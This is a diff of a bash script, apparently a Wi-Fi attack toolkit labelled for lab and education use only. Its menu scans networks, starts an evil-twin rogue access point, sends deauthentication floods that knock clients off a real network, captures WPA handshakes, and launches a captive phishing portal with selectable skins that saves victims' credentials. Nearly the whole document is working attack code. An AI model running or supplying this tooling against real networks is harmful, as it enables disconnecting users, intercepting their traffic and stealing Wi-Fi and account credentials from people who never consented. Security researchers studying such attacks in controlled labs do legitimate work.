@@ -1,6 +1,5 @@
 #!/bin/bash
 
-#======== COLORS ========#
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
@@ -13,11 +12,13 @@ set -e
 AP_CONF="configs/hostapd.conf"
 DNS_CONF="configs/dnsmasq.conf"
 PHISH_PORTAL="phishing_portal"
+SKINS_DIR="$PHISH_PORTAL/skins"
 LOGDIR="logs"
-[ -d "$LOGDIR" ] || mkdir "$LOGDIR"
+[ -d "$LOGDIR" ] || mkdir -p "$LOGDIR"
+[ -d "$SKINS_DIR" ] || mkdir -p "$SKINS_DIR"
 
 function cleanup() {
-    echo -e "${CYAN}[*] Cleaning up: Killing Rogue AP, DNS/DHCP Server, captures${NC}"
+    echo -e "${CYAN}[*] Cleaning up: Killing processes and resetting network${NC}"
     sudo pkill hostapd || true
     sudo pkill dnsmasq || true
     sudo pkill airodump-ng || true
@@ -26,8 +27,8 @@ function cleanup() {
     sudo iptables -F
     sudo iptables -t nat -F
     sudo systemctl restart NetworkManager || sudo service network-manager restart
-    sudo ip link set "$IFACE" down 2>/dev/null || true
-    echo -e "${GREEN}[✓] Teardown complete. Network should be restored.${NC}"
+    [ -n "$IFACE" ] && sudo ip link set "$IFACE" down 2>/dev/null || true
+    echo -e "${GREEN}[✓] Teardown complete.${NC}"
 }
 
 trap cleanup EXIT
@@ -35,19 +36,33 @@ trap cleanup EXIT
 function banner() {
     clear
     echo -e "${BLUE}"
-    echo "  ___  _  _ ___ _  _ _      _        _       _       _             "
-    echo " |_ _|| \\| | __| \\| | |    /_\\  _ _| |_ ___| |___  | |___ ___ ___ "
-    echo "  | | | .\` | _|| .\` | |__ / _ \\| ' \\  _/ _ \\ / -_) | / -_|_-</ -_)"
-    echo " |___||_|\\_|___|_|\\_|____/_/ \\_||_|\\__\\___/_\\___| |_\\___/__|\\___|"
-    echo -e "${CYAN}        Wi-Fi Threat Simulator - For Lab/EDU Only ${NC}"
+    echo "  ___  _  _ ___ _  _ _      _        _       _       _         "
+    echo " |_ _|| \| | __| \| | |    /_\  _ _| |_ ___| |___  | |___ ___ "
+    echo "  | | | .\` | _|| .\` | |__ / _ \\| ' \\  _/ _ \\ / -_) | / -_|_-/"
+    echo " |___||_|\\_|___|_|\\_|____/_/ \\_||_|\\__\\___/_\\___| |_\\___/__|"
+    echo -e "${CYAN}    Wi-Fi Threat Simulator - For Lab/Education only ${NC}"
     echo ""
 }
 
 function prompt_iface(){
-    echo -e "${CYAN}Available interfaces supporting monitor/AP mode:${NC}"
+    echo -e "${CYAN}Available interfaces:${NC}"
     iw dev 2>/dev/null | awk '/Interface/ {print NR") " $2}'
     read -p "Select interface number: " ifaceidx
     IFACE=$(iw dev 2>/dev/null | awk '/Interface/ {print $2}' | sed -n "${ifaceidx}p")
+}
+
+function scan_wifi_interfaces_and_networks() {
+    echo -e "${CYAN}Available wireless interfaces:${NC}"
+    iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}'
+    echo
+    echo -e "${CYAN}Scanning for nearby WiFi networks:${NC}"
+    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
+        echo -e "${YELLOW}[Interface: $iface]${NC}"
+        sudo iw "$iface" scan | grep -E 'SSID:|primary channel' | awk '
+            /primary channel:/ {chan=$3}
+            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
+    done
+    read -p "Press Enter to return to menu..."
 }
 
 function gen_configs() {
@@ -76,24 +91,6 @@ listen-address=10.0.0.1
 EOF
 }
 
-#---- 1. scan WiFi insterfaces ----#
-
-function scan_wifi_interfaces_and_networks() {
-    echo -e "${CYAN}Available wireless interfaces:${NC}"
-    iw dev 2>/dev/null | awk '/Interface/ {print " - " $2}'
-    echo
-    echo -e "${CYAN}Scanning for nearby WiFi networks (may take a few seconds):${NC}"
-    for iface in $(iw dev 2>/dev/null | awk '/Interface/ {print $2}'); do
-        echo -e "${YELLOW}[Interface: $iface]${NC}"
-        sudo iw "$iface" scan | grep -E 'SSID:|primary channel' | awk '
-            /primary channel:/ {chan=$3}
-            /SSID:/ {printf "  SSID: %-30s Channel: %s\n", substr($0, index($0,$2)), chan}'
-    done
-    echo
-    read -p "Press Enter to return to menu..."
-}
-
-#---- 2. Start Evil Twin AP ----#
 function start_rogue_ap(){
     prompt_iface
     read -p "SSID to Clone (target): " FAKESSID
@@ -116,11 +113,9 @@ function start_rogue_ap(){
     sudo dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
     sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
     sudo iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
-
-    echo -e "${GREEN}[+] Evil Twin running, captive portal accessible at 10.0.0.1${NC}"
+    echo -e "${GREEN}[+] Evil Twin running, captive portal on 10.0.0.1${NC}"
 }
 
-#---- 3. Deauth ----#
 function deauth_attack() {
     prompt_iface
     read -p "AP BSSID (target): " BSSID
@@ -128,7 +123,7 @@ function deauth_attack() {
     sudo ip link set "$IFACE" down
     sudo iw "$IFACE" set monitor control
     sudo ip link set "$IFACE" up
-    echo -e "${CYAN}[*] Scanning with airodump-ng (ctrl+c to stop as soon as you see clients) ...${NC}"
+    echo -e "${CYAN}[*] Scanning with airodump-ng (ctrl+c to stop as soon as you see clients)...${NC}"
     sudo airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
     echo -e "${YELLOW}[!] Enter STATION MAC (client MAC) for targeted deauth, or leave empty to broadcast to all:${NC}"
     read -p "Victim STATION MAC (leave empty for broadcast): " STATION
@@ -139,55 +134,55 @@ function deauth_attack() {
     fi
 }
 
-#---- 4. Handshake Capture ----#
 function handshake_capture() {
     prompt_iface
     read -p "AP BSSID (target): " BSSID
     read -p "Channel: " CH
     TS=$(date +%Y%m%d_%H%M%S)
     OUTFILE="$LOGDIR/handshake_$TS"
-    echo -e "${CYAN}[*] Capturing handshakes (write ctrl+c when you see one)... (output: $OUTFILE.cap)${NC}"
+    echo -e "${CYAN}[*] Capturing handshakes (ctrl+c when handshake appears) (output: $OUTFILE.cap)${NC}"
     sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
 }
 
-#---- 5. Phishing Portal ----#
-function phishing_portal() {
-    echo -e "${CYAN}[*] Launching captive portal at http://10.0.0.1 ...${NC}"
-    cd "$PHISH_PORTAL"
-    sudo python3 server.py &
-    cd ..
-    echo -e "${GREEN}[+] Captive portal running. Credentials will be saved to phishing_portal/captured_creds.txt${NC}"
-    read -p "Press Enter to kill captive portal and return to menu..."
-    pkill -f "python3 $PHISH_PORTAL/server.py"
-}
-
-#---- 6. skin selector ----#
-
 function select_portal_skin() {
     echo -e "${CYAN}Available phishing portal skins:${NC}"
-    skins=(phishing_portal/skins/*.html)
+    skins=($SKINS_DIR/*.html)
     for i in "${!skins[@]}"; do
         bname=$(basename "${skins[$i]}")
         echo "$((i+1))) $bname"
     done
     read -p "Select a skin by number: " skn
     [[ "$skn" =~ ^[0-9]+$ ]] && (( skn >= 1 && skn <= ${#skins[@]} )) || { echo "Invalid choice"; return; }
-    cp "${skins[$((skn-1))]}" phishing_portal/index.html
+    cp "${skins[$((skn-1))]}" "$PHISH_PORTAL/index.html"
     echo -e "${GREEN}[✓] Selected skin: $(basename "${skins[$((skn-1))]}")${NC}"
 }
 
-#---- 6. Menu/Teardown ----#
+function phishing_portal() {
+    read -p "Launch portal as HTTP (port 80) or HTTPS (port 443)? [http/https]: " proto
+    cd phishing_portal
+    if [[ "$proto" =~ ^[Hh][Tt][Tt][Pp][Ss]$ ]]; then
+        sudo python3 server.py --https &
+        echo -e "${GREEN}[+] Captive portal running on HTTPS (https://10.0.0.1)${NC}"
+    else
+        sudo python3 server.py &
+        echo -e "${GREEN}[+] Captive portal running on HTTP (http://10.0.0.1)${NC}"
+    fi
+    cd ..
+    read -p "Press Enter to kill captive portal and return to menu..."
+    pkill -f "python3 server.py"
+}
+
 while true; do
     banner
     echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
     echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
     echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
     echo -e "${BLUE}4) Capture WPA Handshake (.cap)${NC}"
-    echo -e "${BLUE}5) Select phishing portal skin"
+    echo -e "${BLUE}5) Choose phishing portal skin${NC}"
     echo -e "${BLUE}6) Launch Captive Phishing Portal${NC}"
     echo -e "${BLUE}7) SAFE TEARDOWN/RESET${NC}"
     echo -e "${BLUE}8) Exit${NC}"
-    echo -ne "${CYAN}Your choice [1-7]: ${NC}"; read CHOICE
+    echo -ne "${CYAN}Your choice [1-8]: ${NC}"; read CHOICE
     case $CHOICE in
         1) scan_wifi_interfaces_and_networks ;;
         2) start_rogue_ap ;;
